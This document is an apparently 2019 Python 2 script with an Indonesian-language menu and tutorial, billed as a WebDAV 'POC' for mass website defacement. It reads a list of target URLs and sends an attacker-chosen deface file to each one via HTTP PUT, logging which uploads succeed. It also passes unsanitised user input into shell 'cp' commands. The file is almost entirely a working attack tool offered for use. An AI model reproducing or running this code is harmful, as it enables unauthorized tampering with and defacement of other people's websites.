#-*-coding:utf-8-*-
# coding by VRX
# recode??silahkan
# sama-sama belajar
# Thanks To Wahyu Andhika
# For Motivasinya ^_^
import sys
import os
import time
# color
################
N = '\033[0m'
W = '\033[1;37m'
B = '\033[1;34m'
M = '\033[1;35m'
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
C = '\033[1;36m'
I = '\033[1;3m'
################
pareasi = """              
%s ___  ___ ___ _   ___ ___   
|   \| __| __/_\ / __| __|%sv2.0
%s| |) | _|| _/ _ \ (__| _|   
|___/|___|_/_/ \_\___|___|   
%sFor Beginners      %s(c)2019
Coded By.VRX%s    POC WEBDAV
---------------------------%s
"""%(B,W,B,R,G,B,W)
try:
    import requests
except ImportError:
    os.system("pip install requests mechanzie")
    import requests
reload(sys)
sys.setdefaultencoding("utf8")
def list_webdav():
    while True:
        temp = raw_input("%s>%s File list.txt : "%(R,W))
        if temp.startswith("/s"):
            os.system("cp " + temp + " $HOME/Deface-Auto")
            print("[*]Sekarang Cukup Masukan Nama Filenya!")
            temp = raw_input("%s> %sNama File: "%(R,W))
        try:
            lists = open((temp), "r")
            lena = open((temp), "r")
            break
        except IOError:
            print ("%s  [ NOT FOUND ]%s"%(R,W))
            continue
    while True:
        sc = raw_input("%s> %sScript Deface: "%(R,W))
        if sc.startswith("/s"):
            os.system("cp " + sc + " $HOME/Deface-Auto")
            print("[!]Tulis Nama Filenya Saja!")
            sc = raw_input("%s> %sNama File: "%(R,W))
        try:
            script = open((sc), "rb").read()
            break
        except IOError:
            print ("%s  [ NOT FOUND ]%s"%(R,W))
            continue
    novita = (len(lena.read().split()) + 1)
    sayang = 0
    success = []
    for i in range(0, (novita)):
        sayang +=1
        if sayang ==novita:
            print ("%s Completed...%s"%(G,W))
            print ("%sSuccess:%s"%(G,W))
            if len(success) >=1:
                for hh in success:
                    print ("\033[32m" + hh)
                lagi = raw_input(" %sAgain? [y/n]: "%(W))
                if lagi =="y" or lagi =="Y":
                    print ("%sPlease Wait...%s"%(G,W))
                    time.sleep(3)
                    return list_webdav()
                else:
                    os.system("python2 auto.py")
            else:
                lagi = raw_input("%s Again? [y/n]: ")
                if lagi =="y" or lagi =="Y":
                    return list_webdav()
                else:
                    os.system("python2 auto.py")
        url = lists.readline().strip()
        if not url.endswith("/"):
            url = url + "/"
        if url.startswith("http"):
            pass
        else:
            url = ("http://" + url)
        try:
            r = requests.request('put', url + sc, data=script, headers={'Content-Type':'application/octet-stream'})
        except:
            print ("  " + url + " %sUrl [ NOT FOUND ]%s"%(R,W))
            continue
        if r.status_code < 200 or r.status_code >= 300:
            print("  " + url + sc + " %s[ FAILED ] %s"%(R,W))
        else:
            print("  " + url + sc + "%s [ SUCCESS ]%s"%(G,W))
            success.append(url + sc)
def tutorial():
	print " "
	print "POC WEBDAV"
	print "Tutorial:"
	print "1.Pas Di Tanyakan List Itu Adalah Tempat dimana"
	print "  Anda Menyimpan File Listnya Contoh :"
	print "  /sdcard/namafilewebanda.txt"
	print "2.terus di suruh masukan nama filenya saja"
	print "  contoh :"
	print "  namafilewebanda.txt"
	print "3.Di Bagian Pas Tanyakan Tempat File Script Deface"
	print "  Itu sama Cara penulisannya Kaya Yang Di Atas"
	print "4.jika Anda Masih Gk Ngerti Ber'Arti Anda TOLOL"
	print " "
	print " "
	print " "
	print " "
	print " "
	print " "
	print "Thanks to"
	print "-WA #bukanwhatsappyaqimak_-"
	print " Atas Motivasinya ^^"
	t = raw_input("%s[?] Balik Ke Menu? [y/n]: "%(W))
	if t =="y" or t =="Y":
		print "Please Wait..."
		time.sleep(2)
		return one()
def one():
    os.system("clear")
    print pareasi
    print ("[+] Daftar Menu:")
    print ("[1] Mulai Deface")
    print ("[2] Tutorial")
    print ("[3] Exit")
    print (" ")
    user = input("%s[!] %sinput/> "%(R,G))
    if user ==1:
        list_webdav()
    elif user ==2:
    	print ("Please Wait...")
    	time.sleep(3)
    	os.system("clear")
    	tutorial()
    elif user ==3:
    	time.sleep(1)
    	print ("Bye Bye Ster ^^")
    	time.sleep(2)
    	print ("Doakan Aku Sukses Y >///<")
    	time.sleep(2)
    	print ("Amin Amin Amin")
    	time.sleep(1)
        sys.exit()
    else:
        print ("%s[!] Pilihan Anda Salah !!!%s"%(R,W))
        time.sleep(1)
        return one()
if __name__=="__main__":
    one()
